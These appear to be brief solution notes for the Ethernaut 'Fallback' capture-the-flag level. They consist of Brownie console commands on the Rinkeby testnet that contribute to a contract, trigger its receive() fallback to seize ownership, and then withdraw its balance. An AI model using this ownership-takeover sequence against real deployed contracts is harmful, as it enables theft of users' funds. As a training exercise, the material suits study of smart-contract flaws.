first need to contribute, then receive() fallback function by sending some eth, then withdraw

in brownie console

brownie console --network rinkeby

acct=accounts.load('ethernaut_rinkeby')

abi={coller l'abi en fmt json}

contract=Contract.from_abi("contract","0x5A47590dA09F3d786eF8Ae855f7AFc780EE56a3B",abi)

contract.contribute( {'from': acct, 'value': Wei('0.0001 ether')})
contract.contributions(acct)
>> send by using fram directly (acct.transfer(contract.address, amount=0.00001, gas_limit=1000000, priority_fee=2, allow_revert=True)) did not work because of max gas config
contract.owner()
contract.withdraw({'from': acct})

